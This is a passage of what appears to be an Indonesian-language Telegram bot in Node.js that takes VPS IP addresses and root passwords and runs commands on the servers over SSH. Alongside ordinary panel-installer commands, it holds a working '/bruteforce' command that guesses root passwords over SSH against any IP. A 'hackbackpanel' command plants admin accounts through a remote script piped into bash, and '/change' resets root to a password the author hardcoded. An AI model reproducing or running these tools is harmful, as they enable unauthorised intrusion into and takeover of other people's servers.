            try { conn.end(); } catch(e) {}
            ctx.reply(`<blockquote>❌ <b>Gagal terhubung ke VPS:</b>\n${err.message}</blockquote>`, { parse_mode: "HTML" });
        });

        conn.connect({
            host: ipvps,
            port: 22,
            username: "root",
            password: passwd,
            readyTimeout: 20000,
        });
        
    } catch (e) {
        try { conn.end(); } catch {}
        console.error("Error /installwings:", e);
        ctx.reply("<blockquote>❌ Terjadi kesalahan internal, coba lagi nanti.</blockquote>", { parse_mode: "HTML" });
    }
});

bot.command(["hbpanel", "hackbackpanel"], async (ctx) => {
    const chatType = ctx.chat.type;
    
    const allowed = await sendIfNotPremium(ctx);
    if (!allowed) return;

    const limitAllowed = await checkUserLimit(ctx, "hbpanel");
    if (!limitAllowed) return;

    const args = ctx.message.text.split(" ").slice(1).join(" ");
    const text = args;

    const parts = text.split("|");
    if (parts.length < 2) {
        return ctx.reply(
            `<blockquote>❗ <b>Format Salah.</b>\n\nGunakan:\n<code>/hbpanel ipvps|pwvps</code></blockquote>`,
            { parse_mode: "HTML" }
        );
    }

    const ipvps = parts[0].trim();
    const passwd = parts[1].trim();

    await ctx.reply("<blockquote>⏳ Sabarr Lagi Gw Hubungkan... Tunggu Dulu Ya monyet GK Sabar mati aja</blockquote>", { parse_mode: "HTML" });

    const newuser = "aldzyishere" + getRandom();
    const newpw = "AldzyIsHere" + getRandom();

    const connSettings = {
        host: ipvps,
        port: 22,
        username: 'root',
        password: passwd,
        readyTimeout: 20000
    };

    const command = `bash <(curl -s https://raw.githubusercontent.com/Bangsano/Autoinstaller-Theme-Pterodactyl/refs/heads/main/install.sh)`;
    const conn = new Client();

    let processCompleted = false;
    const timeout = setTimeout(() => {
        if (!processCompleted) {
            try { conn.end(); conn.destroy(); } catch(e) {}
            ctx.reply('<blockquote>⏱️ <b>Waktu instalasi habis!</b> Proses terlalu lama.</blockquote>', { parse_mode: "HTML" });
        }
    }, 300000);

    try {
        conn.on('ready', () => {
            console.log('SSH ready — menjalankan installer');
            conn.exec(command, (err, stream) => {
                if (err) {
                    processCompleted = true;
                    clearTimeout(timeout);
                    console.error('Exec error:', err);
                    ctx.reply(
                        `<blockquote>❌ <b>Error Bang aokaokaok.</b>\n\n📌 Detail: ${err.message}</blockquote>`,
                        { parse_mode: "HTML" }
                    );
                    conn.end();
                    return;
                }

                stream.on('close', async () => {
                    processCompleted = true;
                    clearTimeout(timeout);
                    const teks = `<blockquote>✅ <b>𝗛𝗮𝗰𝗸𝗯𝗮𝗰𝗸 𝗣𝗮𝗻𝗲𝗹 𝗕𝗲𝗿𝗵𝗮𝘀𝗶𝗹!</b>\n\nAkun Admin Panel:\n\n👤 Username: <code>${newuser}</code>\n🔑 Password: <code>${newpw}</code>\n\nSilakan lanjutkan pengaturan melalui panel yang telah diinstal.</blockquote>`;
                    try { 
                        await ctx.reply(teks, { parse_mode: "HTML" }); 
                    } catch(e) {
                        console.error("Gagal mengirim pesan:", e);
                    }
                    conn.end();
                });

                stream.on('data', (data) => {
                    const out = data.toString();
                    console.log('[STDOUT]', out);

                    try {
                        if (out.includes('Enter username') || /enter username/i.test(out) || /username:/i.test(out)) {
                            stream.write(`${newuser}\n`);
                        }
                        if (out.includes('Enter password') || /enter password/i.test(out) || /password:/i.test(out)) {
                            stream.write(`${newpw}\n`);
                        }
                        if (out.includes('(y/N)') || /y\/n/i.test(out)) {
                            stream.write('y\n');
                        }
                        if (out.includes('Input 0-6') || /input 0-6/i.test(out)) {
                            stream.write('0\n');
                        }
                    } catch (e) {}
                });

                stream.stderr.on('data', (data) => {
                    const errOut = data.toString();
                    console.log('[STDERR]', errOut);

                    try {
                        stream.write("7\n");
                        stream.write(`${newuser}\n`);
                        stream.write(`${newpw}\n`);
                    } catch (e) {}
                });
            });
        });

        conn.on('error', (err) => {
            processCompleted = true;
            clearTimeout(timeout);
            console.error('Connection Error:', err);
            ctx.reply(
                '<blockquote>❌ <b>Koneksi Gagal</b> - Sandi Atau IP tidak Valid.</blockquote>',
                { parse_mode: "HTML" }
            );
        });

        conn.connect(connSettings);
        
    } catch (error) {
        processCompleted = true;
        clearTimeout(timeout);
        console.error('Conn.connect exception:', error);
        ctx.reply(
            `<blockquote>❌ <b>Gagal Memulai Koneksi.</b>\n\n📌 Detail: ${error.message}</blockquote>`,
            { parse_mode: "HTML" }
        );
    }
});

// ------------------------ [ Command: Install Panel ( Fixed ) ] ------------------------ \\
bot.command("installpanel", async (ctx) => {
    const chatType = ctx.chat.type;
    const userId = ctx.from.id.toString();
    
    const allowed = await sendIfNotPremium(ctx);
    if (!allowed) return;
    
    const limitAllowed = await checkUserLimit(ctx, "installpanel");
    if (!limitAllowed) return;

    const args = ctx.message.text.split(" ").slice(1).join(" ");
    const input = args;

    if (!input.includes("|")) {
        return ctx.reply(
            `<blockquote>❗ <b>FORMAT SALAH</b>\n\nGunakan:\n<code>/installpanel ipvps|password|domainpnl|domainnode|ramvps</code>\n\n📌 Contoh:\n<code>/installpanel 1.1.1.1|password123|panel.domain.com|node.domain.com|8000</code>\n➡️ Contoh ramvps:\n• 40000 = 4GB\n• 80000 = 8GB\n• 160000 = 16GB</blockquote>`,
            { parse_mode: "HTML" }
        );
    }

    const t = input.split('|');
    if (t.length < 5) {
        return ctx.reply(
            `<blockquote>❗ <b>FORMAT SALAH</b>\n\nGunakan:\n<code>/installpanel ipvps|password|domainpnl|domainnode|ramvps</code>\n\n📌 Contoh:\n<code>/installpanel 1.1.1.1|password123|panel.domain.com|node.domain.com|8000</code>\n➡️ Contoh ramvps:\n• 40000 = 4GB\n• 80000 = 8GB\n• 160000 = 16GB</blockquote>`,
            { parse_mode: "HTML" }
        );
    }

    const [ipvps, passwd, subdomain, domainnode, ramvps] = t.map(v => v.trim());
    const conn = new Client();
    const password = 'admin';
    const command = 'bash <(curl -s https://pterodactyl-installer.se)';
    const commandWings = 'bash <(curl -s https://pterodactyl-installer.se)';
    
    let lastMsgId = null;

    try { // <- jembot Lu Hahahha
        conn.on('ready', async () => {
            if (lastMsgId) {
                try { await ctx.deleteMessage(lastMsgId); } catch (e) {}
            }
            
            const msg1 = await ctx.reply("<blockquote>🚀 PROSES INSTALL PANEL SEDANG BERLANGSUNG, MOHON TUNGGU 5-10 MENIT</blockquote>", { parse_mode: "HTML" });
            lastMsgId = msg1.message_id;

            conn.exec(command, (err, stream) => {
                if (err) {
                    try { conn.end(); conn.destroy(); } catch(e) {}
                    ctx.reply(`<blockquote>❌ Error: ${err.message}</blockquote>`, { parse_mode: "HTML" });
                    return;
                }

                stream.on('close', async (code, signal) => {
                    console.log(`Panel install stream closed: ${code}, ${signal}`);
                    
                    try { await ctx.deleteMessage(lastMsgId); } catch (e) {}
                    const msg2 = await ctx.reply("<blockquote>🛠️ PROSES INSTALL WINGS, MOHON TUNGGU 5 MENIT</blockquote>", { parse_mode: "HTML" });
                    lastMsgId = msg2.message_id;

                    installWings(conn);
                }).on('data', (data) => {
                    handlePanelInstallationInput(data, stream, subdomain, password);
                }).stderr.on('data', (data) => {
                    console.log('STDERR:', data.toString());
                });
            });
        });

        conn.on('error', (err) => {
            ctx.reply(`<blockquote>❌ Gagal terhubung ke VPS: ${err.message}</blockquote>`, { parse_mode: "HTML" });
        });

        conn.connect({
            host: ipvps,
            port: 22,
            username: "root",
            password: passwd,
            readyTimeout: 20000
        });

    } catch (error) {
        console.error("Error in installpanel:", error);
        ctx.reply(`<blockquote>❌ Terjadi kesalahan: ${error.message}</blockquote>`, { parse_mode: "HTML" });
    }

    function installWings(conn) {
        conn.exec(commandWings, (err, stream) => {
            if (err) {
                try { conn.end(); conn.destroy(); } catch(e) {}
                ctx.reply(`<blockquote>❌ Error Wings: ${err.message}</blockquote>`, { parse_mode: "HTML" });
                return;
            }

            stream.on('close', async (code, signal) => {
                console.log(`Wings install stream closed: ${code}, ${signal}`);
                try { await ctx.deleteMessage(lastMsgId); } catch (e) {}
                
                const msg3 = await ctx.reply("<blockquote>📡 MEMULAI CREATE NODE & LOCATION</blockquote>", { parse_mode: "HTML" });
                lastMsgId = msg3.message_id;

                createNode(conn);
            }).on('data', (data) => {
                handleWingsInstallationInput(data, stream, domainnode, subdomain);
            }).stderr.on('data', (data) => {
                console.log('STDERR:', data.toString());
            });
        });
    }

    function createNode(conn) {
        const command = config.bash;
        
        conn.exec(command, (err, stream) => {
            if (err) {
                try { conn.end(); conn.destroy(); } catch(e) {}
                ctx.reply(`<blockquote>❌ Error Node: ${err.message}</blockquote>`, { parse_mode: "HTML" });
                return;
            }

            stream.on('close', async () => {
                try { await ctx.deleteMessage(lastMsgId); } catch (e) {}
                
                const msg4 = await ctx.reply("<blockquote>⚙️ GENERATE CONFIG & START WINGS</blockquote>", { parse_mode: "HTML" });
                lastMsgId = msg4.message_id;
                
                const cmdCfg = `
                    cd /var/www/pterodactyl && php artisan p:node:configuration 1 > /etc/pterodactyl/config.yml && chmod 600 /etc/pterodactyl/config.yml && systemctl restart wings
                `;

                conn.exec(cmdCfg, async (err3, stream2) => {
                    if (err3) {
                        try { await ctx.deleteMessage(lastMsgId); } catch (e) {}
                        ctx.reply(`<blockquote>❌ Gagal generate config / start wings: ${err3.message}</blockquote>`, { parse_mode: "HTML" });
                        return;
                    }

                    stream2.on("exit", async () => {
                        try { await ctx.deleteMessage(lastMsgId); } catch (e) {}
                        sendPanelData();
                        try { conn.end(); conn.destroy(); } catch(e) {}
                    });
                });
            }).on('data', (data) => {
                handleNodeCreationInput(data, stream, domainnode, ramvps);
            }).stderr.on('data', (data) => {
                console.log('Node STDERR:', data.toString());
            });
        });
    }

    function sendPanelData() {
        ctx.reply(
            `<blockquote><b>Install Panel Selesai Berikut Data Anda</b></blockquote>

<b>Data Vps Anda</b>
🌐 Ip Vps: <code>${ipvps}</code>
🔐 Password: <code>${passwd}</code>

<b>📦 Berikut Detail Akun Panel Kamu:</b>
👤 <b>Username:</b> <code>admin</code>
🔐 <b>Password:</b> <code>${password}</code>
🌐 <b>Domain:</b> ${subdomain}

━━━━━━━━━━━━━━━━━━━━━━━
<blockquote>Jangan Lupa Support @ReyValdz</blockquote>
━━━━━━━━━━━━━━━━━━━━━━━`,
            { parse_mode: "HTML" }
        );
    }

    // ------------- HANDLER INTERAKSI SHELL -------------
    function handlePanelInstallationInput(data, stream, subdomain, password) {
        const str = data.toString();
        if (str.includes('Input')) {
            stream.write('0\n\n\n1248\nAsia/Jakarta\nadmin@gmail.com\nadmin@gmail.com\nadmin\nadmin\nadmin\n');
            stream.write(`${password}\n`);
            stream.write(`${subdomain}\n`);
            stream.write('y\ny\ny\ny\ny\n\n1\n');
        }
        if (str.includes("Select the appropriate number")) stream.write("1\n");
        if (str.includes("Still assume SSL")) stream.write("y\n");
        if (str.includes('Please read the Terms of Service')) stream.write('y\n');
        console.log('Panel STDOUT:', str);
    }

    function handleWingsInstallationInput(data, stream, domainnode, subdomain) {
        const str = data.toString();
        if (str.includes('Input')) {
            stream.write('1\ny\ny\ny\n');
            stream.write(`${subdomain}\n`);
            stream.write('y\nuser\n1248\ny\n');
            stream.write(`${domainnode}\n`);
            stream.write('y\nadmin@gmail.com\ny\n');
        }
        if (str.includes("automatically configure HTTPS using Let's Encrypt")) {
            stream.write("y\n");
        }
        console.log('Wings STDOUT:', str);
    }

    function handleNodeCreationInput(data, stream, domainnode, ramvps) {
        const token = config.tokeninstall || "";
        stream.write(`${token}\n4\nSGP\nJangan Lupa Support @ReyValdz\n`);
        stream.write(`${domainnode}\nNODES\n${ramvps}\n${ramvps}\n1\n`);
        console.log('Node STDOUT:', data.toString());
    }
});

/*
// ------------------------ [ Command: Install Panel ] ------------------------ \\
bot.command("installpanel", async (ctx) => {
    const chatType = ctx.chat.type;
    
    if (isGroupOnly() && chatType === 'private') {
        return ctx.reply('<blockquote>❌ This bot can only be used in groups.</blockquote>', { parse_mode: "HTML" });
    }
    
    const limitAllowed = await checkUserLimit(ctx, "installpanel");
    if (!limitAllowed) return;

    const args = ctx.message.text.split(" ").slice(1).join(" ");
    const input = args;

    if (!input.includes("|")) {
        return ctx.reply(
            "<blockquote>❌ <b>Format salah!</b>\n\nGunakan:\n<code>/installpanel ipvps|pwvps|panel.com|node.com|ramserver</code></blockquote>",
            { parse_mode: "HTML" }
        );
    }

    const [ipvps, pwvps, domainpanel, domainnode, ramserver] = input.split("|").map(v => v.trim());
    if (!ipvps || !pwvps || !domainpanel || !domainnode || !ramserver) {
        return ctx.reply(
            "<blockquote>❌ <b>Format salah!</b>\n\nGunakan:\n<code>/installpanel ipvps|pwvps|panel.com|node.com|ramserver</code></blockquote>",
            { parse_mode: "HTML" }
        );
    }

    const conn = new Client();
    const user = "admin";
    const pass = "admin001";
    const scriptPanel = "bash <(curl -s https://pterodactyl-installer.se)";
    const scriptNode = "bash <(curl -s https://raw.githubusercontent.com/Bangsano/Autoinstaller-Theme-Pterodactyl/main/createnode.sh)";

    try {
        await ctx.reply(
            `<blockquote>⏳ Menghubungkan ke VPS <b>${ipvps}</b>...\nProses instalasi <b>Panel + Node Wings</b> dimulai...</blockquote>`,
            { parse_mode: "HTML" }
        );

        let processCompleted = false;
        const timeout = setTimeout(() => {
            if (!processCompleted) {
                try { conn.end(); conn.destroy(); } catch (e) {}
                ctx.reply('<blockquote>⏱️ <b>Waktu koneksi habis!</b> Periksa VPS dan coba lagi.</blockquote>', { parse_mode: "HTML" });
            }
        }, 300000);

        conn.on("ready", () => {
            ctx.reply("<blockquote>⚙️ <b>Koneksi berhasil!</b> Memulai instalasi Panel...</blockquote>", { parse_mode: "HTML" });

            conn.exec(scriptPanel, (err, stream) => {
                if (err) {
                    processCompleted = true;
                    clearTimeout(timeout);
                    try { conn.end(); } catch (e) {}
                    return ctx.reply(`<blockquote>❌ <b>Gagal menjalankan script Panel!</b>\n<code>${err.message}</code></blockquote>`, { parse_mode: "HTML" });
                }

                let output = "";

                stream.on("data", (data) => {
                    const str = data.toString();
                    output += str;

                    if (str.includes("Input 0-6")) stream.write("0\n");
                    if (str.includes("(y/N)")) stream.write("y\n");
                    if (str.includes("Database name")) stream.write(`${user}\n`);
                    if (str.includes("Database username")) stream.write(`${user}\n`);
                    if (str.includes("Password (press enter")) stream.write(`${pass}\n`);
                    if (str.includes("Select timezone")) stream.write("Asia/Jakarta\n");
                    if (str.includes("Provide the email")) stream.write("admin@gmail.com\n");
                    if (str.includes("Email address for the initial admin account")) stream.write("admin@gmail.com\n");
                    if (str.includes("Username for the initial admin account")) stream.write(`${user}\n`);
                    if (str.includes("First name")) stream.write("adm\n");
                    if (str.includes("Last name")) stream.write("adm\n");
                    if (str.includes("Password for the initial admin account")) stream.write(`${pass}\n`);
                    if (str.includes("Set the FQDN")) stream.write(`${domainpanel}\n`);
                    if (str.includes("automatically configure UFW")) stream.write("y\n");
                    if (str.includes("configure HTTPS")) stream.write("y\n");
                    if (str.includes("Select the appropriate number")) stream.write("1\n");
                    if (str.includes("I agree")) stream.write("y\n");
                    if (str.includes("Proceed anyways")) stream.write("y\n");
                    if (str.includes("(yes/no)")) stream.write("yes\n");
                    if (str.includes("Initial configuration completed")) stream.write("y\n");
                    if (str.includes("Still assume SSL")) stream.write("y\n");
                    if (str.includes("Please read the Terms")) stream.write("y\n");
                    if (str.includes("(A)gree/(C)ancel")) stream.write("A\n");
                });

                stream.stderr.on("data", (data) => {
                    output += `\n[ERROR] ${data.toString()}`;
                });

                stream.on("close", (code, signal) => {
                    ctx.reply("<blockquote>✅ <b>Instalasi Panel selesai!</b> Melanjutkan instalasi Node Wings...</blockquote>", { parse_mode: "HTML" });

                    conn.exec(scriptNode, (err2, stream2) => {
                        if (err2) {
                            processCompleted = true;
                            clearTimeout(timeout);
                            try { conn.end(); } catch (e) {}
                            return ctx.reply(`<blockquote>❌ <b>Gagal menjalankan script Node!</b>\n<code>${err2.message}</code></blockquote>`, { parse_mode: "HTML" });
                        }

                        let nodeOutput = "";

                        stream2.on("data", (data) => {
                            const s = data.toString();
                            nodeOutput += s;

                            if (s.includes("Masukkan nama lokasi:")) stream2.write("SGP\n");
                            if (s.includes("Masukkan deskripsi lokasi:")) stream2.write("Vps Premium By AldzyIsHere\n");
                            if (s.includes("Masukkan domain:")) stream2.write(`${domainnode}\n`);
                            if (s.includes("Masukkan nama node:")) stream2.write("NODES\n");
                            if (s.includes("Masukkan RAM")) stream2.write(`${ramserver}\n`);
                            if (s.includes("Masukkan jumlah maksimum disk")) stream2.write(`${ramserver}\n`);
                            if (s.includes("Masukkan Locid:")) stream2.write("1\n");
                        });

                        stream2.stderr.on("data", (data) => {
                            nodeOutput += `\n[ERROR] ${data.toString()}`;
                        });

                        stream2.on("close", (code2, signal2) => {
                            processCompleted = true;
                            clearTimeout(timeout);
                            try { conn.end(); } catch (e) {}

                            const cleanOut = nodeOutput.trim().slice(-3800) || "(tidak ada output)";
                            const teks = `<blockquote>✅ <b>INSTAL PANEL SELESAI!</b>\n\n📦 <b>Akun Panel:</b>\n👤 Username: <code>${user}</code>\n🔑 Password: <code>${pass}</code>\n🌐 Domain: <code>${domainpanel}</code>\n\n🧩 Node: ${domainnode}\n💾 RAM: ${ramserver} MB\n\n📘 Jalankan Wings pakai:\n<code>/startwings ${ipvps}|${pwvps}|tokenwings</code>\n\n🧾 Output terakhir:\n<code>${cleanOut}</code></blockquote>`;

                            ctx.reply(teks, { parse_mode: "HTML" });
                        });
                    });
                });
            });
        });

        conn.on("error", (err) => {
            processCompleted = true;
            clearTimeout(timeout);
            try { conn.end(); } catch (e) {}
            ctx.reply(`<blockquote>❌ <b>Gagal terhubung ke VPS!</b>\nPeriksa IP dan Password.\n\nError:\n<code>${err.message}</code></blockquote>`, { parse_mode: "HTML" });
        });

        conn.connect({
            host: ipvps,
            port: 22,
            username: "root",
            password: pwvps,
            readyTimeout: 20000,
        });
    } catch (e) {
        clearTimeout(timeout);
        try { conn.end(); } catch (err) {}
        console.error("Error /installpanel:", e);
        ctx.reply("<blockquote>❌ Terjadi kesalahan internal. Coba lagi nanti.</blockquote>", { parse_mode: "HTML" });
    }
});
*/

// ------------------------ [ Command: Brute Force ] ------------------------ \\
bot.command("bruteforce", async (ctx) => {
    const chatType = ctx.chat.type;
    const userId = ctx.from.id.toString();
    
    const allowed = await sendIfNotPremium(ctx);
    if (!allowed) return;
    
    const limitAllowed = await checkUserLimit(ctx, "bruteforce");
    if (!limitAllowed) return;

    const args = ctx.message.text.split(" ").slice(1).join(" ");
    const input = args.trim();

    if (!input) {
        return ctx.reply(
            `<blockquote>❌ <b>Format salah!</b>\n\nContoh:\n<code>/bruteforce 123.44.33.22,10,10</code> (MAX 100x)\n\n📌 <b>Format:</b> IP,20,20\n• Panjang password: 1-16 karakter\n• Maksimal percobaan: 100x</blockquote>`,
            { parse_mode: "HTML" }
        );
    }

    const parts = input.split(",");
    if (parts.length < 3) {
        return ctx.reply(
            `<blockquote>❌ <b>Parameter kurang!</b>\n\nButuh 3 parameter dipisah koma:\n1. IP VPS\n2. Panjang password (1-16)\n3. Jumlah percobaan (1-100)\n\nContoh: <code>/bruteforce 123.44.33.22,10,10</code></blockquote>`,
            { parse_mode: "HTML" }
        );
    }

    const ip = parts[0].trim();
    const lengthStr = parts[1].trim();
    const tryStr = parts[2].trim();

    const length = parseInt(lengthStr, 10);
    let userTry = parseInt(tryStr, 10);

    // Validasi IP
    const ipRegex = /^(\d{1,3}\.){3}\d{1,3}$/;
    if (!ipRegex.test(ip)) {
        return ctx.reply(
            `<blockquote>❌ <b>Format IP tidak valid!</b>\n\nContoh IP yang benar:\n<code>123.123.123.123</code>\n\nIP yang kamu input: <code>${ip}</code></blockquote>`,
            { parse_mode: "HTML" }
        );
    }

    if (!/^\d+$/.test(lengthStr) || isNaN(length) || length < 1 || length > 16) {
        return ctx.reply(
            `<blockquote>❌ <b>Panjang password tidak valid!</b>\n\nHarus angka antara <b>1-16</b>\nInput kamu: <code>${lengthStr}</code>\n\nContoh: <code>8</code> untuk password 8 karakter</blockquote>`,
            { parse_mode: "HTML" }
        );
    }

    if (!/^\d+$/.test(tryStr) || isNaN(userTry) || userTry < 1) {
        return ctx.reply(
            `<blockquote>❌ <b>Jumlah percobaan tidak valid!</b>\n\nHarus angka minimal 1\nInput kamu: <code>${tryStr}</code>\n\nContoh: <code>10</code> untuk 10 kali percobaan</blockquote>`,
            { parse_mode: "HTML" }
        );
    }

    const MAX_TRY = 100;
    let notice = "";

    if (userTry > MAX_TRY) {
        notice = "⚠️ Percobaan dibatasi maksimal <b>100x</b>. Permintaan kamu disesuaikan otomatis.\n\n";
        userTry = MAX_TRY;
    }

    let attempts = 0;
    const triedPasswords = [];
    
    const sentMsg = await ctx.reply(
        `<blockquote>${notice}🔄 <b>Progress: 0/${userTry}</b>\n⏳ Sedang mencoba password...</blockquote>`,
        { parse_mode: "HTML" }
    );

    const tryLogin = () => {
        if (attempts >= userTry) {
            const list = triedPasswords
                .map((p, i) => `${i + 1}. ${p}`)
                .join("\n");

            ctx.editMessageText(
                `<blockquote>❌ <b>LOGIN GAGAL</b>\nIPVPS   : <code>${ip}</code>\nPASSWORD:\n${list}\nPERCOBAAN: ${attempts}x\nCATATAN: BRUTE FORCE DAPAT MENYEBABKAN DELAY DAN MENINGKATKAN PENGGUNAAN RAM IPVPS.</blockquote>`,
                {
                    chat_id: sentMsg.chat.id,
                    message_id: sentMsg.message_id,
                    parse_mode: "HTML"
                }
            );
            return;
        }
        
        attempts++;
        
        ctx.editMessageText(
            `<blockquote>${notice}🔄 <b>Progress: ${attempts}/${userTry}</b>\n⏳ Sedang mencoba password ke-${attempts}...</blockquote>`,
            {
                chat_id: sentMsg.chat.id,
                message_id: sentMsg.message_id,
                parse_mode: "HTML"
            }
        );

        const password = genRandomPass(length);
        triedPasswords.push(password);

        const conn = new Client();
        let done = false;

        conn.on("ready", () => {
            done = true;
            conn.end();
            ctx.editMessageText(
                `<blockquote>✅ <b>LOGIN BERHASIL</b>\nIPVPS     : <code>${ip}</code>\nPASSWORD  : <code>${password}</code>\nPERCOBAAN : ${attempts}x\nCATATAN: ANJAY HOKY DAPET PASSWORD BENER GACOR.</blockquote>`,
                {
                    chat_id: sentMsg.chat.id,
                    message_id: sentMsg.message_id,
                    parse_mode: "HTML"
                }
            );
        });
        
        conn.on("error", () => {
            if (done) return;
            conn.end();
            setTimeout(tryLogin, 1000);
        });

        conn.connect({
            host: ip.trim(),
            port: 22,
            username: "root",
            password,
            readyTimeout: 8000,
        });
    };

    tryLogin();
});

// ------------------------ [ Command: Cek IP ] ------------------------ \\
bot.command("cekip", async (ctx) => {
    const chatType = ctx.chat.type;
    const userId = ctx.from.id.toString();
    
    const allowed = await sendIfNotPremium(ctx);
    if (!allowed) return;
    
    const limitAllowed = await checkUserLimit(ctx, "cekip");
    if (!limitAllowed) return;

    const args = ctx.message.text.split(" ").slice(1).join(" ");
    let target = args?.trim();

    if (!target) {
        return ctx.reply(
            "<blockquote>❌ Format salah!\nContoh:\n<code>/cekip google.com</code>\natau\n<code>/cekip https://google.com</code></blockquote>",
            { parse_mode: "HTML" }
        );
    }
    
    try {
        if (!target.startsWith("http://") && !target.startsWith("https://")) {
            target = "http://" + target;
        }
        target = new URL(target).hostname;
    } catch (e) {
        return ctx.reply(
            "<blockquote>❌ URL tidak valid</blockquote>",
            { parse_mode: "HTML" }
        );
    }

    const sentMsg = await ctx.reply(
        "<blockquote>⏳ Proses cek IPVPS...</blockquote>",
        { parse_mode: "HTML" }
    );

    dns.lookup(target, (err, address) => {
        if (err) {
            ctx.editMessageText(
                `<blockquote>❌ <b>GAGAL CEK IP</b>\nTARGET : <code>${target}</code>\nINFO   : Tidak dapat resolve IP</blockquote>`,
                {
                    chat_id: sentMsg.chat.id,
                    message_id: sentMsg.message_id,
                    parse_mode: "HTML"
                }
            );
            return;
        }

        ctx.editMessageText(
            `<blockquote>✅ <b>HASIL CEK IP</b>\nDOMAIN : <code>${target}</code>\nIPVPS  : <code>${address}</code></blockquote>`,
            {
                chat_id: sentMsg.chat.id,
                message_id: sentMsg.message_id,
                parse_mode: "HTML"
            }
        );
    });
});

// ------------------------ [ Command: Hostname ] ------------------------ \\
bot.command("hostname", async (ctx) => {
    const chatType = ctx.chat.type;
    const userId = ctx.from.id.toString();
    
    const allowed = await sendIfNotPremium(ctx);
    if (!allowed) return;
    
    const limitAllowed = await checkUserLimit(ctx, "hostname");
    if (!limitAllowed) return;

    const args = ctx.message.text.split(" ").slice(1);
    
    if (args.length < 3) {
        return ctx.reply(
            "<blockquote>❌ Format salah!\nGunakan:\n<code>/hostname ipvps password hostname-baru</code></blockquote>",
            { parse_mode: "HTML" }
        );
    }

    const ipVps = args[0];
    const password = args[1];
    const newHostname = args.slice(2).join(" ").trim();

    const ssh = new NodeSSH();

    try {
        const sentMsg = await ctx.reply(
            "<blockquote>🔄 Mengganti hostname...</blockquote>",
            { parse_mode: "HTML" }
        );

        await ssh.connect({
            host: ipVps,
            username: "root",
            password: password,
            readyTimeout: 15000
        });

        const oldHost = await ssh.execCommand("hostname");
        const oldHostname = oldHost.stdout.trim();

        await ssh.execCommand(`hostnamectl set-hostname ${newHostname}`);
        await ssh.execCommand(
            `sed -i "s/^127.0.1.1.*/127.0.1.1 ${newHostname}/" /etc/hosts`
        );

        ctx.editMessageText(
            `<blockquote>🔄 Mengganti hostname...\n🎯 Berhasil mengganti hostname\n🖥️ Hostname lama: ${oldHostname}\n🚀 Hostname baru: ${newHostname}</blockquote>`,
            {
                chat_id: sentMsg.chat.id,
                message_id: sentMsg.message_id,
                parse_mode: "HTML"
            }
        );

        ssh.dispose();
    } catch (err) {
        ctx.reply(
            `<blockquote>❌ Gagal mengganti hostname\n${err.message}</blockquote>`,
            { parse_mode: "HTML" }
        );
    }
});

// ------------------------ [ Command: Change Password ] ------------------------ \\
const NEW_PASSWORD = "AldzyIsHere33112";

function isIP(text) {
    return /^(\d{1,3}\.){3}\d{1,3}$/.test(text);
}

bot.command("change", async (ctx) => {
    const chatType = ctx.chat.type;
    const userId = ctx.from.id.toString();
    
    const allowed = await sendIfNotPremium(ctx);
    if (!allowed) return;
    
    const limitAllowed = await checkUserLimit(ctx, "change");
    if (!limitAllowed) return;

    const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
    const input = args;

    if (!input) {
        return ctx.reply(
            "<blockquote>❌ Format salah\n\nGunakan:\n<code>/change IP PASSWORD</code>\natau\n<code>/change PASSWORD IP</code></blockquote>",
            { parse_mode: "HTML" }
        );
    }

    const parts = input.split(/\s+/);
    if (parts.length < 2) {
        return ctx.reply(
            "<blockquote>❌ Format salah\n\nGunakan:\n<code>/change IP PASSWORD</code>\natau\n<code>/change PASSWORD IP</code></blockquote>",
            { parse_mode: "HTML" }
        );
    }

    let ip, oldPassword;

    if (isIP(parts[0])) {
        ip = parts[0];
        oldPassword = parts[1];
    } else if (isIP(parts[1])) {
        ip = parts[1];
        oldPassword = parts[0];
    } else {
        return ctx.reply(
            "<blockquote>❌ IP VPS tidak valid</blockquote>",
            { parse_mode: "HTML" }
        );
    }

    const sentMsg = await ctx.reply(
        "<blockquote>🔄 Menghubungkan ke VPS...\n⏳ Mohon tunggu</blockquote>",
        { parse_mode: "HTML" }
    );

    const ssh = new NodeSSH();

    try {
        await ssh.connect({
            host: ip,
            username: "root",
            password: oldPassword,
            port: 22,
            readyTimeout: 20000
        });

        ctx.editMessageText(
            "<blockquote>🔐 Login berhasil\n⚙️ Mengganti password...</blockquote>",
            {
                chat_id: sentMsg.chat.id,
                message_id: sentMsg.message_id,
                parse_mode: "HTML"
            }
        );

        const exec = await ssh.execCommand(
            `echo "root:${NEW_PASSWORD}" | chpasswd`
        );

        if (exec.stderr) throw exec.stderr;

        ctx.editMessageText(
            `<blockquote>✅ <b>PASSWORD VPS BERHASIL DIGANTI</b>\n\nIpvps: ${ip}\nPassword lama: ${oldPassword}\nPassword baru: <code>${NEW_PASSWORD}</code></blockquote>`,
            {
                chat_id: sentMsg.chat.id,
                message_id: sentMsg.message_id,
                parse_mode: "HTML"
            }
        );

        ssh.dispose();
    } catch (err) {
        ctx.editMessageText(
            "<blockquote>❌ Gagal ganti password VPS\nPastikan IP & password lama benar</blockquote>",
            {
                chat_id: sentMsg.chat.id,
                message_id: sentMsg.message_id,
                parse_mode: "HTML"
            }
        );
    }
});
/*
bot.command("changepassword", async (ctx) => {
    const userId = ctx.from.id.toString();
    const chatType = ctx.chat.type;

    const limitAllowed = await checkUserLimit(ctx, "changepassword");
    if (!limitAllowed) return;

    const args = ctx.message.text.split(" ").slice(1);
    const text = args.join(" ");
    
    if (!text) {
        return ctx.reply(
            "<blockquote>❌ <b>Syntax Error!</b>\n\nUse : <code>/changepassword ipvps,password,newpassword</code>\nExample : <code>/changepassword 192.168.1.1,oldpass,newpass</code>\n\n© AldzyIsHere</blockquote>"
        );
    }

    const t = text.split(',');
    
    if (t.length < 3) {
        return ctx.reply(
            "<blockquote>❌ <b>Syntax Error!</b>\n\nUse : <code>/changepassword ipvps,password,newpassword</code>\nExample : <code>/changepassword 192.168.1.1,oldpass,newpass</code>\n\n© AldzyIsHere</blockquote>"
        );
    }

    const ipvps = t[0];
    const passwd = t[1];
    const passvpsnew = t[2];
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    const command = 'bash <(curl -s https://raw.githubusercontent.com/XstyanzZx/xyroku/main/install.sh)';
    const conn = new Client();

    await ctx.reply("<blockquote>📢 <b>Changing VPS Password</b>\n\n_Sedang mengubah password VPS..._</blockquote>", 
        { parse_mode: "HTML" });

    conn.on('ready', () => {
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            
            stream.on('close', (code, signal) => {
                console.log(`Stream closed with code ${code} and signal ${signal}`);
